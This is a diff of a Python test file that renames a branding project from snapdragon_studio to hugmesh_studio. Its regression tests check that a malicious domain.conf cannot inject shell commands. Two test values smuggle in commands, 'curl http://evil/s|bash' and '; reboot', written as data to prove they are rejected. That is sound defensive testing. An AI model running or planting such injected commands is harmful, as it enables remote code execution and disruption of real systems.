@@ -11,9 +11,9 @@ import os
 
 import pytest
 
-from snapdragon_studio.core import keyzip
-from snapdragon_studio.core.config import Domain, ImageConfig
-from snapdragon_studio.core.validate import (
+from hugmesh_studio.core import keyzip
+from hugmesh_studio.core.config import Domain, ImageConfig
+from hugmesh_studio.core.validate import (
     IdentityValidationError,
     validate_accent_color,
     validate_brand,
@@ -31,9 +31,9 @@ from snapdragon_studio.core.validate import (
 def test_clean_defaults_pass():
     """The committed defaults (brand snap-class, org Snapdragon-Systems, user, domain)
     must still produce a CLI arg list without raising."""
-    cfg = ImageConfig(brand="snapdragon", org="Snapdragon-Systems",
-                      brand_title="Snapdragon Systems",
-                      cluster_domain="snapdragon.systems", local_user="snap")
+    cfg = ImageConfig(brand="hugmesh", org="Snapdragon-Systems",
+                      brand_title="HugMesh Systems",
+                      cluster_domain="hugmesh.systems", local_user="snap")
     args = cfg.to_cli_args()
     assert "--local-user" in args and "snap" in args
 
@@ -213,10 +213,10 @@ def test_keyzip_domain_conf_injection_rejected(tmp_path):
     """The confirmed key-zip RCE: a malicious domain.conf must NOT set cfg.brand."""
     path = _write_domain_conf(
         tmp_path, 'BRAND="x"; curl http://evil/s|bash; #\n')
-    cfg = ImageConfig(brand="snapdragon")
+    cfg = ImageConfig(brand="hugmesh")
     warnings: list[str] = []
     keyzip._apply_domain_conf(path, cfg, warnings)
-    assert cfg.brand == "snapdragon"          # original value preserved, not overwritten
+    assert cfg.brand == "hugmesh"          # original value preserved, not overwritten
     assert any("BRAND" in w for w in warnings)
 
 
@@ -252,10 +252,10 @@ def test_keyzip_domain_conf_json_injection_rejected(tmp_path):
     p = os.path.join(str(tmp_path), "domain.json")
     with open(p, "w", encoding="utf-8") as fh:
         fh.write('{"BRAND": "x; reboot"}')
-    cfg = ImageConfig(brand="snapdragon")
+    cfg = ImageConfig(brand="hugmesh")
     warnings: list[str] = []
     keyzip._apply_domain_conf(p, cfg, warnings)
-    assert cfg.brand == "snapdragon"
+    assert cfg.brand == "hugmesh"
     assert warnings
 
 
@@ -302,7 +302,7 @@ def test_validate_package_atoms_newline_word_rejected():
 
 def test_superdomain_internal_accepted_and_derived_valid():
     # an explicit <brand>.internal passes validate_identity; "" derives it (also valid)
-    ImageConfig(mode="mesh", role="omnibus", superdomain="snapdragon.internal").to_cli_args()
+    ImageConfig(mode="mesh", role="omnibus", superdomain="hugmesh.internal").to_cli_args()
     ImageConfig(mode="mesh", role="omnibus", brand="acme").to_cli_args()   # derived acme.internal
 
 
